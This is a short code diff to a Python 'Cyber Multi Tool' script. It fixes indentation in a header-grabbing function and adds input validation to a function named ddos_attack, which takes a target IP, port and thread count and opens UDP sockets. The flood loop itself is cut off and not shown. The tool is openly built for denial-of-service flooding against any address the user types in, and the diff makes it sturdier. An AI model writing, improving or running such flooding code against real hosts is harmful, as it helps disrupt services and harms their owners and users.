@@ -11,7 +11,7 @@ def info_gathering():
         res = requests.get(url)
         soup = BeautifulSoup(res.text, 'html.parser')
         print("Welcome to the Cyber Multi Tool!")
-print(f"[+] Title: {soup.title.string if soup.title else 'N/A'}")
+        print(f"[+] Title: {soup.title.string if soup.title else 'N/A'}")
         print(f"[+] Server Header: {res.headers.get('Server', 'N/A')}")
         print(f"[+] X-Powered-By: {res.headers.get('X-Powered-By', 'N/A')}")
     except Exception as e:
@@ -27,8 +27,12 @@ def ip_tracker():
 
 def ddos_attack():
     ip = input("Enter target IP: ")
-    port = int(input("Enter target port: "))
-    threads = int(input("Number of threads: "))
+    try:
+        port = int(input("Enter target port: "))
+        threads = int(input("Number of threads: "))
+    except ValueError:
+        print("[!] Invalid port or thread number!")
+        return
 
     def attack():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
